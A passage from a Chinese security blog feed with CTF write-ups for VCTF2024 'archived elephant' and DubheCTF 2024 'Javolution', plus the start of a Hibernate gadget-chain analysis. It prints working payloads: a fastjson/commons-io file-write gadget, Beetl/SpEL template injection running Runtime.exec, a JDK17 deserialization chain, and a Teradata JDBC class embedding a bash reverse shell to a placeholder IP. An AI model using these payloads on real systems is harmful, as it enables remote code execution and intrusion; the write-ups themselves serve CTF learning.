class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>:&#123;<span class="hljs-string">&quot;allowUrlInLocalInfile&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;allowLoadLocalInfile&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;allowLoadLocalInfileInPath&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;maxAllowedPacket&quot;</span>:<span class="hljs-string">&quot;655360&quot;</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;fileread_file:///&quot;</span>,<span class="hljs-string">&quot;NUM_HOSTS&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;&#125;</code></pre></div><p>把这段内容拼接到分析的filename中</p><p><img src="/../images/VCTF2024/image-20240321195325259.png" alt="image-20240321195325259"></p><p><img src="/../images/VCTF2024/image-20240321180119976.png" alt="image-20240321180119976"></p><p><img src="/../images/VCTF2024/image-20240321180207365.png" alt="image-20240321180207365"></p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>预期的话就是我熟悉的fastjson+common-io写文件</p><p>大体的话是覆盖btl文件，写入的内容就是beetl模板注入RCE</p><p>先给出最后的覆盖内容，然后再说细节</p><p>覆盖<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl</code></p><div class="code-wrapper"><pre><code class="hljs stylus">$&#123;@venom<span class="hljs-selector-class">.elephantcms</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.WhiteListNativeSecurityManager</span><span class="hljs-selector-class">.test</span>(<span class="hljs-string">&#x27;org.springframework,java.beans,venom.elephantcms&#x27;</span>)&#125;</code></pre></div><p>第二次文件写入覆盖<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/upload.btl</code>打<code>RCE</code>即可。</p><div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>写入内容$&#123;@java.beans.Beans.instantiate<span class="hljs-params">(null,parameter.a)</span><span class="hljs-string">.parseExpression</span><span class="hljs-params">(parameter.b)</span><span class="hljs-string">.getValue</span><span class="hljs-params">()</span>&#125;<span class="hljs-string">//</span>使用<span class="hljs-string">/upload</span>?a=org.springframework.expression.spel.standard.SpelExpressionParser&amp;b=new java.util.Scanner<span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;whoami&#x27;)</span><span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)<span class="hljs-string">.next</span><span class="hljs-params">()</span></code></pre></div><h4 id="开始说明"><a href="#开始说明" class="headerlink" title="开始说明"></a>开始说明</h4><p>这是fastjson+common-io写文件的poc</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,  <span class="hljs-string">&quot;is&quot;</span>:&#123;    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,    <span class="hljs-string">&quot;input&quot;</span>:&#123;      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,      <span class="hljs-string">&quot;reader&quot;</span>:&#123;        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,        <span class="hljs-string">&quot;charSequence&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa&quot;</span>   //长度应大于<span class="hljs-number">8192</span>      &#125;,      <span class="hljs-string">&quot;charsetName&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>,           <span class="hljs-string">&quot;bufferSize&quot;</span>:<span class="hljs-number">1024</span>    &#125;,    <span class="hljs-string">&quot;branch&quot;</span>:&#123;      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,      <span class="hljs-string">&quot;writer&quot;</span>: &#123;        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,        <span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;/tmp/pwned&quot;</span>,        <span class="hljs-string">&quot;encoding&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,        <span class="hljs-string">&quot;append&quot;</span>: false      &#125;,      <span class="hljs-string">&quot;charset&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,     <span class="hljs-regexp">//</span>键名为charset或charsetName即可      <span class="hljs-string">&quot;bufferSize&quot;</span>: <span class="hljs-number">1024</span>,      <span class="hljs-string">&quot;writeImmediately&quot;</span>: true    &#125;,    <span class="hljs-string">&quot;closeBranch&quot;</span>:true  &#125;,  <span class="hljs-string">&quot;httpContentType&quot;</span>:<span class="hljs-string">&quot;text/xml&quot;</span>,  <span class="hljs-string">&quot;lenient&quot;</span>:false,  <span class="hljs-string">&quot;defaultEncoding&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>&#125;</code></pre></div><p>第一点是<code>fastjson</code>调用构造函数存在随机性，而<code>WriterOutputStream</code>恰好有一堆很相似的构造函数，所以在构造的时候需要注意<code>WriterOutputStream</code>构造方法的第二个属性是<code>charset</code>或<code>charsetName</code>，如果属性名称错误会报<code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: create instance error, null, public</code>。</p><div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-constructor">WriterOutputStream(Writer <span class="hljs-params">writer</span>, Charset <span class="hljs-params">charset</span>, <span class="hljs-params">int</span> <span class="hljs-params">bufferSize</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">writeImmediately</span>)</span> &#123;    this(writer, charset.<span class="hljs-keyword">new</span><span class="hljs-constructor">Decoder()</span>.on<span class="hljs-constructor">MalformedInput(CodingErrorAction.REPLACE)</span>.on<span class="hljs-constructor">UnmappableCharacter(CodingErrorAction.REPLACE)</span>.replace<span class="hljs-constructor">With(<span class="hljs-string">&quot;?&quot;</span>)</span>, bufferSize, writeImmediately);&#125;public <span class="hljs-constructor">WriterOutputStream(Writer <span class="hljs-params">writer</span>, String <span class="hljs-params">charsetName</span>, <span class="hljs-params">int</span> <span class="hljs-params">bufferSize</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">writeImmediately</span>)</span> &#123;    this(writer, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Charset</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">charsetName</span>)</span>, bufferSize, writeImmediately);&#125;</code></pre></div><p>解决方法在上面的poc的注释中</p><p>第二点是该方法（应该）仅支持绝对路径文件写入，<code>MiscCodec</code>中限制了相对路径写入。不过题目给出<code>docker</code>所以选手到时候看<code>docker</code>里的模板路径就可以了。如果难度不够的话绝对路径这部分可以当个考点。</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz != <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InetAddress</span>.</span></span><span class="hljs-keyword">class</span><span class="hljs-operator"> &amp;&amp; </span>clazz != <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Inet4Address</span>.</span></span><span class="hljs-keyword">class</span><span class="hljs-operator"> &amp;&amp; </span>clazz != <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Inet6Address</span>.</span></span><span class="hljs-keyword">class</span>) &#123;<span class="hljs-keyword">if</span> (clazz<span class="hljs-operator"> == </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">File</span>.</span></span><span class="hljs-keyword">class</span>) &#123;    <span class="hljs-keyword">if</span> (strVal.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;..&quot;</span>)</span> &gt;= <span class="hljs-number">0</span><span class="hljs-operator"> &amp;&amp; </span>!FILE_RELATIVE_PATH_SUPPORT) &#123;        throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONException(<span class="hljs-string">&quot;file relative path not support.&quot;</span>)</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        return <span class="hljs-keyword">new</span> <span class="hljs-constructor">File(<span class="hljs-params">strVal</span>)</span>;    &#125;</code></pre></div><p><img src="/../images/VCTF2024/image-20240321183310167.png" alt="image-20240321183310167"></p><p>第三点是写不进去双引号<code>&quot;</code>，分号<code>;</code>之类的字符。这部分不是任意文件写这条<code>gadget</code>的问题，而是因为<code>ueditor</code>这里的<code>JSON</code>注入是个<code>http</code>请求头中的<code>filename</code>注入，所以写一些奇怪字符会导致<code>http</code>请求出现一些问题。结合<code>beetl</code>语法用<code>parameter.a</code>就能绕过了。后续在访问恶意模板时加个参数<code>?a</code>即可。</p><p>这一点确实不知道，没了解过beetl</p><h4 id="beetl模板注入RCE的说明"><a href="#beetl模板注入RCE的说明" class="headerlink" title="beetl模板注入RCE的说明"></a>beetl模板注入RCE的说明</h4><p>出题人写了一个白名单类，只允许调用<code>venom.elephantcms</code>的方法</p><p><img src="/../images/VCTF2024/image-20240321183547596.png" alt="image-20240321183547596"></p><p>但这个类中的test方法允许添加</p><p><img src="/../images/VCTF2024/image-20240321183630491.png" alt="image-20240321183630491"></p><p>出题人提到<code>callPattern</code>他故意没写<code>final</code>修饰。</p><h4 id="最后理一下"><a href="#最后理一下" class="headerlink" title="最后理一下"></a>最后理一下</h4><p>覆盖<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl</code></p><div class="code-wrapper"><pre><code class="hljs stylus">$&#123;@venom<span class="hljs-selector-class">.elephantcms</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.WhiteListNativeSecurityManager</span><span class="hljs-selector-class">.test</span>(<span class="hljs-string">&#x27;org.springframework,java.beans,venom.elephantcms&#x27;</span>)&#125;</code></pre></div><p>这是为了beetl模板注入RCE添加白名单</p><p>第二次文件写入覆盖<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/upload.btl</code>打<code>RCE</code></p><div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>写入内容$&#123;@java.beans.Beans.instantiate<span class="hljs-params">(null,parameter.a)</span><span class="hljs-string">.parseExpression</span><span class="hljs-params">(parameter.b)</span><span class="hljs-string">.getValue</span><span class="hljs-params">()</span>&#125;<span class="hljs-string">//</span>使用<span class="hljs-string">/upload</span>?a=org.springframework.expression.spel.standard.SpelExpressionParser&amp;b=new java.util.Scanner<span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;whoami&#x27;)</span><span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)<span class="hljs-string">.next</span><span class="hljs-params">()</span></code></pre></div><p>使用parameter.a就是为了防止http请求出错</p><p>不过还有个坑点就是第二步覆盖的模板不能是<code>test.btl</code>了，可能是缓存的原因导致即便写入第二次的<code>payload</code>访问模板还是会执行第一次的<code>payload</code></p><p>再提一下，防止有的人对这个poc不了解产生误区</p><p>两个写入的内容并不只有提到的一点，fastjson+common-io写入的长度应大于8192，然后才会截取前8192个字符</p><p>所以在写入内容的基础上，我们要往后面填充空格使长度满足要求 （反正exp是这样做的</p><p><a href="https://github.com/ChaMd5Team/Venom-WP/blob/main/2024VenomCTF/2024_vctf_web_archived-elephant/writeup/exp.py">Venom-WP&#x2F;2024VenomCTF&#x2F;2024_vctf_web_archived-elephant&#x2F;writeup&#x2F;exp.py at main · ChaMd5Team&#x2F;Venom-WP (github.com)</a></p><p>给出官方exp，exp中写文件的poc好像有点不一样，不知道</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>hackjs还是思路太局限了，elephant的话审计代码确实没什么经验，都不好找漏洞点</p><p>想审计一下cms了，不管是php的还是java的都想看看，一点经验都没有</p><p>想着根据每个cms的RCE开始分析，但不知道啥时候会开始</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/ChaMd5Team/Venom-WP/tree/main/2024VenomCTF/2024_vctf_web_archived-elephant/writeup">Venom-WP&#x2F;2024VenomCTF&#x2F;2024_vctf_web_archived-elephant&#x2F;writeup at main · ChaMd5Team&#x2F;Venom-WP (github.com)</a></p><p><a href="http://www.ulsteruni.cn/article/68236820.html">VCTF-archived elephant (ulsteruni.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Javolution</title>
    <link href="/2024/03/18/Javolution/"/>
    <url>/2024/03/18/Javolution/</url>
    
    <content type="html"><![CDATA[<h1 id="DubheCTF-2024-–Javolution"><a href="#DubheCTF-2024-–Javolution" class="headerlink" title="DubheCTF 2024 –Javolution"></a>DubheCTF 2024 –Javolution</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>心理原因，自己太菜了，导致自己不想或者说不敢去打XCTF，这次V&amp;N的各位佬火力全开，web 5&#x2F;6，都是血</p><p>但跟我一点关系没有，等到这个java上线后才开始看这道题</p><p>web中有两个xss，而且还混有脏东西（呜呜，会不了一点</p><p>其他也好难，不会，不想看</p><p>但这个java其实我也没多少贡献，唉。。。</p><h2 id="unknown师傅做java的时间线"><a href="#unknown师傅做java的时间线" class="headerlink" title="unknown师傅做java的时间线"></a>unknown师傅做java的时间线</h2><blockquote><p>检查jdk17中哪些gadget还能用的。</p><p>检查过程中，jdk17中，不能像之前一样修改私有属性了，会报错。我的解决方法：设置agent，把该处判断hook掉，成功修改私有属性。</p><p>然后是看gadget有哪些，最终还剩这些：</p><p>EventListenerList：readObject -&gt; toString</p><p>POJONode：toString -&gt; getter。</p><p>此时是3.17 凌晨1点44分，先睡觉。</p><p>第二天早上9点。</p><p>尝试把TemplatesImpl放进POJONode，toString时报错，有关module的问题。</p><p>此时我毫无缘由地想到套一层JDKDynamicProxy，成功执行getOutputProperties。</p><p>接下来看如何加载字节码并new对象。</p><p>debug发现，字节码可以进入define，但是define时会检查字节码的module，由于该字节码的类是继承了AbstractTranslet的，而AbstractTranslet所在的module没有open，所以define这里过不去。</p><p>猜测module信息会被编译进字节码，此时我一个很大胆的想法：手动把module信息加进恶意字节码，让这个module变成能够访问AbstractTranslet的module。差了点资料，基本没有，放弃。</p><p>此时的方向应该回到题目给的TeraDataSource#getConnection。</p><p>能够实现令题目靶机jdbc连接vps了，此时是3.17 中午12点多。</p><p>此时的想法：Java中rce的方法不多，TemplatesImpl加载字节码被封死了，还剩URLClassLoader远程类加载、JNDI，直接调Runtime执行命令的类，第三方库基本没有吧，这么危险，所以没有往这方面想。</p><p>考虑JNDI加载beanfactory，试了下，tomcat版本太高，已经修复了BeanFactory。JNDI无。</p><p>这里完全没有头绪了。</p><p>一位队友发现了Tera里的Runtime，豁然开朗。此时是1点53分。不到30分钟路线已经找到，剩下的就是满足路线的条件。</p><p> 开始debug。</p><p>发现会发请求，得接收，不然会抛异常。好，一位队友起了个数据库环境，请求成功。</p><p>发现会根据数据库响应的不同数据进入不同分支，好，抓包，手搓服务端。手搓完成，实现了1-2次交互，并能简单控制走向。</p><p>后面，代码越来越复杂，不知如何构造响应数据。</p><p>越来越红温。</p><p>此时队友找到个现成的恶意服务端的代码，我草。此时是7点20分。</p><p>8点16分，拿到flag。</p></blockquote><p>历时一天，我只能说太nb了</p><p>鄙人唯一的贡献就是上面说到的发现Tera里的Runtime，这对当时没有头绪的unknown师傅也算指明了一条路</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>故事的开始是那么的美好，有趣的打怪升级</p><p>直接拿V&amp;N队里师傅的python脚本讲解一下</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://1.95.54.152:40957/pal&quot;</span> <span class="hljs-comment"># 初始化一级的人物</span><span class="hljs-comment"># battle depresso up 10 level</span>url1 = url + <span class="hljs-string">&quot;/battle/depresso&quot;</span>   <span class="hljs-comment">#升到10级</span><span class="hljs-built_in">print</span>(url1)<span class="hljs-built_in">print</span>(requests.get(url1).text)time.sleep(<span class="hljs-number">0.5</span>)<span class="hljs-comment"># capture Mammorest</span>url3 = url + <span class="hljs-string">&quot;/capture?name=mammorest&quot;</span>   <span class="hljs-comment">#修改数值也打不过，但是可以捕捉高自己10级的boss</span><span class="hljs-built_in">print</span>(requests.get(url3).text)time.sleep(<span class="hljs-number">0.5</span>)url4 = url + <span class="hljs-string">&quot;/capture?name=Grizzbolt&quot;</span>  <span class="hljs-comment">#继续捕捉</span><span class="hljs-built_in">print</span>(requests.get(url4).text)time.sleep(<span class="hljs-number">0.5</span>)<span class="hljs-comment">#目前为止是30级，但下一个boss是50级，打也打不过，抓也抓不了</span><span class="hljs-comment"># change defense and hp</span>url2 = url + <span class="hljs-string">&quot;/cheat?hp=6000&amp;defense=-2147483645&quot;</span>  <span class="hljs-comment">#修改自己防御为负数</span><span class="hljs-built_in">print</span>(requests.get(url2).text)time.sleep(<span class="hljs-number">0.5</span>)battle_jetragon = url + <span class="hljs-string">&quot;/battle/jetragon&quot;</span>   <span class="hljs-comment">#这里就利用int的强制类型转化导致的负数溢出为了整数</span><span class="hljs-built_in">print</span>(requests.get(battle_jetragon).text)<span class="hljs-comment">#这里就到了50级，就可以了</span>battle_flag = url + <span class="hljs-string">&quot;/battle/flag&quot;</span><span class="hljs-built_in">print</span>(requests.get(battle_flag).text)show = url + <span class="hljs-string">&quot;/show&quot;</span><span class="hljs-built_in">print</span>(requests.get(show).text)</code></pre></div><p><img src="/../images/Javolution/image-20240318155751537.png" alt="image-20240318155751537"></p><p>整数溢出的漏洞</p><p><img src="/../images/Javolution/image-20240318155445477.png" alt="image-20240318155445477"></p><p>做到这一步我和V&amp;N里的另一个师傅进度差不多，他把步骤写到协助文档里了，等于说我啥贡献都没有，唉毕竟人人都会（呜呜</p><h2 id="接着"><a href="#接着" class="headerlink" title="接着"></a>接着</h2><p>我们升到50级就是为了这里</p><p><img src="/../images/Javolution/image-20240318160421752.png" alt="image-20240318160421752"></p><p><img src="/../images/Javolution/image-20240318160318011.png" alt="image-20240318160318011"></p><p>host中要有dubhe，而且又要判断ip为127.0.0.1</p><p>那就设置一个子域名有dubhe的域名，然后给他个A记录设置为127.0.0.1 （unknown师傅太强了</p><p><img src="/../images/Javolution/image-20240318160622710.png" alt="image-20240318160622710"></p><h2 id="重头戏"><a href="#重头戏" class="headerlink" title="重头戏"></a>重头戏</h2><p>然后就能够进行反序列化了</p><p><img src="/../images/Javolution/image-20240318160709098.png" alt="image-20240318160709098"></p><p>但关键是java版本是17啊。。。。。。。</p><p><img src="/../images/Javolution/image-20240318160750590.png" alt="image-20240318160750590"></p><p>然后就是找toString链子，以及调用什么getter</p><p>这里我直接摆烂，jdk17的什么module会不了一点</p><p>这里就是unknown搞出来的</p><p>设置agent，把jdk17判断判断反射处的逻辑hook掉，成功修改私有属性。</p><p>然后是看gadget有哪些，最终还剩这些：</p><p>EventListenerList：readObject -&gt; toString  （看到有这个我人快傻掉了，明明说好jdk17不行的。。。。</p><p>POJONode：toString -&gt; getter。</p><p>然后unknown师傅继续尝试TemplatesImpl，但实际上是用不了的</p><p>高版本JDK中TemplatesImpl已经被移除，或者说无法使用</p><p>然后目标就转到PalDataSource的getConnection方法上</p><h2 id="我的唯一贡献"><a href="#我的唯一贡献" class="headerlink" title="我的唯一贡献"></a>我的唯一贡献</h2><p>当时到这里就没有进度了，那反正我就半摆烂地debug源码</p><p>一步步跟进去，结果真让我发现个Runtime，哈哈哈哈哈哈哈</p><p><img src="/../images/Javolution/image-20240318161941676.png" alt="image-20240318161941676"></p><p>unknown把我发他的截图放到协作文档中，也算有了个参与感吧</p><p>路线：</p><p>TeraDataSourceBase.createNewConnection –&gt; ConnectionFactory.createConnection new RawConnection —&gt; RawConnection构造函数引用父类构造GenericTeradataConnection  —&gt; GenericTeradataConnection构造函数—&gt;RCE</p><p>然后就要看如何走到这一步了</p><p>逻辑很简单，但本地运行会卡住</p><p>卡在这一步</p><p><img src="/../images/Javolution/image-20240318162214705.png" alt="image-20240318162214705"></p><p>根据分析应该是要连接上数据库</p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>继续摆，不会搭建Teradata数据库</p><p>unknown他们自己搭数据库环境，甚至自己抓包，写恶意服务端，越到后面越不知道服务端怎么写。最后发现有现成的</p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>这一波典中典，又有写好的恶意服务端</p><p>本地的PalDataSource，好像说包名也要一样（不清楚</p><div class="code-wrapper"><pre><code class="hljs Bash">public class PalDataSource extends TeraDataSource &#123;    public <span class="hljs-function"><span class="hljs-title">PalDataSource</span></span>()&#123;        String cmd = <span class="hljs-string">&quot;bash -i &gt;&amp;/dev/tcp/your_ip/16666 0&gt;&amp;1&quot;</span>;        String <span class="hljs-built_in">command</span> = <span class="hljs-string">&quot;bash -c &#123;echo,&quot;</span>+Base64.getEncoder().encodeToString(cmd.getBytes())+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;        System.out.println(<span class="hljs-built_in">command</span>);        setBROWSER(<span class="hljs-built_in">command</span>);        setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);        setDSName(<span class="hljs-string">&quot;your_ip&quot;</span>);        setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);    &#125;    @Override // com.teradata.jdbc.TeraDataSource, javax.sql.DataSource    public Connection getConnection(String username, String password) throws SQLException &#123;        <span class="hljs-built_in">return</span> super.getConnection(username, password);    &#125;    @Override // com.teradata.jdbc.TeraDataSourceBase, javax.sql.CommonDataSource    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;        <span class="hljs-built_in">return</span> null;    &#125;&#125;</code></pre></div><p>unknown给出的poc （前面说到他自己用了个agent，所以要加载才能使用</p><p>并且动态代理那里改为<code>DataSource.class</code>也很细节</p><div class="code-wrapper"><pre><code class="hljs Bash">public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception, IllegalAccessException &#123;    Field field = getField(obj.getClass(), fieldname);    <span class="hljs-keyword">if</span> (field == null) &#123;        throw new Exception(<span class="hljs-string">&quot;field &quot;</span> + fieldname + <span class="hljs-string">&quot;not found!&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;    Field field = null;    try &#123;        field = clazz.getDeclaredField(fieldName);        field.setAccessible(<span class="hljs-literal">true</span>);    &#125; catch (NoSuchFieldException var4) &#123;        <span class="hljs-keyword">if</span> (clazz.getSuperclass() != null) &#123;            field = getField(clazz.getSuperclass(), fieldName);        &#125;    &#125;    <span class="hljs-built_in">return</span> field;&#125;public static Object unserialize(byte[] bytes) throws Exception &#123;    ObjectInputStream <span class="hljs-keyword">in</span> = new ObjectInputStream(new ByteArrayInputStream(bytes));    <span class="hljs-built_in">return</span> in.readObject();&#125;public static byte[] serialize(Object obj) throws Exception &#123;    ByteArrayOutputStream bytes = new ByteArrayOutputStream();    ObjectOutputStream out = new ObjectOutputStream(bytes);    out.writeObject(obj);    <span class="hljs-built_in">return</span> bytes.toByteArray();&#125;public static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception &#123;    Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);    Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);    cons.setAccessible(<span class="hljs-literal">true</span>);    AdvisedSupport advisedSupport = new AdvisedSupport();    advisedSupport.setTarget(templatesImpl);    InvocationHandler handler = (InvocationHandler)cons.newInstance(advisedSupport);    Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;DataSource.class&#125;, handler);    <span class="hljs-built_in">return</span> proxyObj;&#125;public static void main( String[] args )throws Exception &#123;    PalDataSource palDataSource = new PalDataSource();    Object pojoNodeStableProxy = getPOJONodeStableProxy(palDataSource);    POJONode jsonNodes = new POJONode(pojoNodeStableProxy);    EventListenerList list = new EventListenerList();    UndoManager manager = new UndoManager();    Vector vector = (Vector) Util.getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);    vector.add(jsonNodes);    setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, new Object[]&#123;InternalError.class, manager&#125;);    System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(serialize(list))));&#125;</code></pre></div><p><img src="/../images/Javolution/image-20240318163213092.png" alt="image-20240318163213092"></p><h1 id="其他战队WP"><a href="#其他战队WP" class="headerlink" title="其他战队WP"></a>其他战队WP</h1><p>域名那里可以不用自己去弄，<code>sudo.cc</code>本就是执行<code>localhost</code>的，所以<code>dubhe.sudo.cc</code>即可</p><p>然后就是关键的jdk17如何造链子，做法贼简单</p><p>在vm-option加上</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-attr">--add-opens</span> java.base/java.util=ALL-UNNAMED <span class="hljs-attr">--add-exports</span>  java.xml/com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects=ALL-UNNAMED</code></pre></div><p>即可</p><p>woc，我看这个东西的时候是讲的jdk9，我以为jdk17就不行了，服了</p><p>然后可以使用XString的toString链子</p><p>但是好像不能实例化（TEL✌用的反射，然后配合上面这个vm-option）</p><p><a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf (blackhat.com)</a></p><p>攻击手法这篇论文中都讲到了，呜呜根本搜不到论文</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hibernate利用链</title>
    <link href="/2024/03/08/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2024/03/08/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Hibernate利用链"><a href="#Hibernate利用链" class="headerlink" title="Hibernate利用链"></a>Hibernate利用链</h1><h2 id="Hibernate-1"><a href="#Hibernate-1" class="headerlink" title="Hibernate 1"></a>Hibernate 1</h2><p>给出调用栈</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TypedValue</span>.</span></span>hash<span class="hljs-constructor">Code()</span>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ValueHolder</span>.</span></span>get<span class="hljs-constructor">Value()</span>            ValueHolder.<span class="hljs-constructor">DeferredInitializer()</span>.initialize<span class="hljs-literal">()</span>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ComponentType</span>.</span></span>get<span class="hljs-constructor">HashCode()</span>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PojoComponentTuplizer</span>.</span></span>get<span class="hljs-constructor">PropertyValue()</span>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractComponentTuplizer</span>.</span></span>get<span class="hljs-constructor">PropertyValue()</span>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BasicPropertyAccessor$BasicGetter</span>.</span></span>get<span class="hljs-literal">()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GetterMethodImpl</span>.</span></span>get<span class="hljs-literal">()</span>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span></code></pre></div><p>这里分几个部分，思路清晰一点</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>漏洞点在</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314171559670.png" alt="image-20240314171559670"></p><p>能够反射执行方法</p><p>那我们看看这个method如何控制</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183122424.png" alt="image-20240314183122424"></p><p>在<code>getGetterOrNull</code>中首先调用getterMethod获取getter方法，然后在最后调用构造方法return一个BasicGetter对象,method在构造方法中被赋值</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183350585.png" alt="image-20240314183350585"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>因此现在的思路就是哪里会调用get方法，经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314183647213.png" 